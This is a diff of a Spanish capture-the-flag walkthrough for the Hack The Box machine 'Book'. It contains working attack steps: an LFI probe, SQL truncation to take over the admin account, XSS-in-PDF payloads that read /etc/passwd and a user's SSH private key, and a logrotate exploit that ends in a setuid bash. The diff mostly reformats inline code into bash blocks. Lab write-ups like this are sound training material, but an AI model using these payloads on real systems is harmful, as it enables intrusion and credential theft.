@@ -66,11 +66,23 @@ en un panel de inicio de session.
 nmap --script http-enum -p80 10.10.10.176 -oN webScan
 ```
 
-Vemos un directorio `/admin`
+Vemos un directorio 
+```bash
+ /admin 
+```
+
 
 #### Checkear la web {-}
 
-Si entramos en la url `http://10.10.10.176`, Vemos una pagina que nos permite loggear o registrar. En la pagina `http://10.10.10.176/admin` tenemos un
+Si entramos en la url 
+```bash
+ http://10.10.10.176 
+```
+, Vemos una pagina que nos permite loggear o registrar. En la pagina 
+```bash
+ http://10.10.10.176/admin 
+```
+ tenemos un
 otro panel de inicio de session para el panel de administracion.
 
 Empezamos por crear una cuenta
@@ -82,7 +94,15 @@ Aqui vemos una biblioteca. Podemos
 - añadir un libro a la coleccion
 - contactar el administrator
 
-Haciendo Hovering a las imagenes de la pagina `books.php`, vemos que hay un link a `http://10.10.10.176/download.php?file=1`
+Haciendo Hovering a las imagenes de la pagina 
+```bash
+ books.php 
+```
+, vemos que hay un link a 
+```bash
+ http://10.10.10.176/download.php?file=1 
+```
+
 
 Miramos con curl si es vulnerable a LFI
 
@@ -95,7 +115,15 @@ curl -s -X GET "http://10.10.10.176/download.php?file=../../../../../../etc/pass
 
 No parece ser vulnerable en este caso.
 
-En las paginas `/collections.php` y `/contact.php` vemos que las request necessitan ser validadas por otro usuario. Miramos si es vulnerable a un XSS
+En las paginas 
+```bash
+ /collections.php 
+```
+ y 
+```bash
+ /contact.php 
+```
+ vemos que las request necessitan ser validadas por otro usuario. Miramos si es vulnerable a un XSS
 
 ```bash
 python3 -m http.server 80
@@ -148,7 +176,19 @@ la columna corespondiente en el SQL esta definida con un tamaño. Esta vulnerabi
 de la peticion sql. En un caso como este, y mas precisamente en el panel de registo, en vez de crear un nuevo usuario, podriamos como
 atacante cambiar la contraseña de este mismo usuario superando el tamaño definido en SQL.
 
-Si el tamaño definido por la columna `email` es `varchar(16)`, si como atacante ponemos el email `admin@book.htb` con espacios al final mas
+Si el tamaño definido por la columna 
+```bash
+ email 
+```
+ es 
+```bash
+ varchar(16) 
+```
+, si como atacante ponemos el email 
+```bash
+ admin@book.htb 
+```
+ con espacios al final mas
 cualquier carater y que en este caso excede este tamaño de 16, podriamos cambiar su contraseña.
 
 Si en burpsuite creamos un usuario con la data
@@ -166,12 +206,28 @@ name=admin&email=admin@book.htb               .&password=admin123
 
 la respuesta es un 302 Found.
 
-Si nos connectamos ahora como `admin` y con la contraseña `admin123`, podemos entrar como el usuario admin.
-En este caso vamos directamente a la url `http://10.10.10.176/admin` para entrar en el panel de administracion de la web.
+Si nos connectamos ahora como 
+```bash
+ admin 
+```
+ y con la contraseña 
+```bash
+ admin123 
+```
+, podemos entrar como el usuario admin.
+En este caso vamos directamente a la url 
+```bash
+ http://10.10.10.176/admin 
+```
+ para entrar en el panel de administracion de la web.
 
 Aqui Vemos que podemos ver los usuarios registrados, los mensajes enviados por los usuarios los feedbacks y la collections.
 
-Aqui nos llama la atencion el `/admin/collections.php` porque hay un link a un pdf de la collectiones de la web.
+Aqui nos llama la atencion el 
+```bash
+ /admin/collections.php 
+```
+ porque hay un link a un pdf de la collectiones de la web.
 Si nos acordamos bien, el contenido es muy parecido a las entradas que teniamos como usuario normal a la hora de crear una nueva
 collection.
 
@@ -190,17 +246,41 @@ Buscamos en internet si existe un html 2 pdf exploit.
 
 ### html2pdf exploit {-}
 
-Buscamos por `html 2 pdf exploit`, no vemos gran cosa. Cambiamos la busqueda por vulnerabilidades conocidas como RCE LFI XSS
+Buscamos por 
+```bash
+ html 2 pdf exploit 
+```
+, no vemos gran cosa. Cambiamos la busqueda por vulnerabilidades conocidas como RCE LFI XSS
 y encontramos un un [Local File Read via XSS in Dynamically Generated PDF](https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/)
 
-Aqui vemos que con la inclusion de un `<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>`
+Aqui vemos que con la inclusion de un 
+```bash
+ <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script> 
+```
+
 podriamos ejecutar un LFI.
 
-Si lo ponemos en el input Title y author, podemos ver el `/etc/passwd` de la maquina en el pdf generado.
+Si lo ponemos en el input Title y author, podemos ver el 
+```bash
+ /etc/passwd 
+```
+ de la maquina en el pdf generado.
 
-En este caso vemos que hay un usuario `Reader` que tiene una bash. Miramos si podemos leer su `id_rsa`
+En este caso vemos que hay un usuario 
+```bash
+ Reader 
+```
+ que tiene una bash. Miramos si podemos leer su 
+```bash
+ id_rsa 
+```
 
-`<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>`
+
+
+```bash
+ <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script> 
+```
+
 
 Ya podemos ver su llave privada y connectarnos por ssh.
 ## Vuln exploit & Gaining Access {-}
@@ -241,7 +321,11 @@ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
 ./pspy64
 ```
 
-pspy nos muestra que hay un `/usr/sbin/logrote` que se ejecuta a interval regular de tiempo.
+pspy nos muestra que hay un 
+```bash
+ /usr/sbin/logrote 
+```
+ que se ejecuta a interval regular de tiempo.
 
 ```bash
 uname -a
@@ -285,7 +369,11 @@ Lanzamos el script
 logrotten -p payloadfile /home/reader/backups/access.log
 ```
 
-Nos conectamos nuevamente por ssh a la maquina victima para modificar el fichero `access.log`
+Nos conectamos nuevamente por ssh a la maquina victima para modificar el fichero 
+```bash
+ access.log 
+```
+
 
 ```bash
 ssh reader@10.10.10.176 -i id_rsa
@@ -294,6 +382,17 @@ echo "s4vitar" > backups/access.log
 ```
 
 Esperamos un poco y ganamos accesso al systema. Pero se desconecta bastante rapido. Volvemos nuevamente a lanzar el script
-y rapidamente colamos un `chmod 4755 /bin/bash` de seguida que ganamos accesso al systema antes que se desconnecte.
+y rapidamente colamos un 
+```bash
+ chmod 4755 /bin/bash 
+```
+ de seguida que ganamos accesso al systema antes que se desconnecte.
 
-Desde una shell ssh ya podemos lanzar un `bash -p` y leer el fichero `root.txt`
+Desde una shell ssh ya podemos lanzar un 
+```bash
+ bash -p 
+```
+ y leer el fichero 
+```bash
+ root.txt 
+```
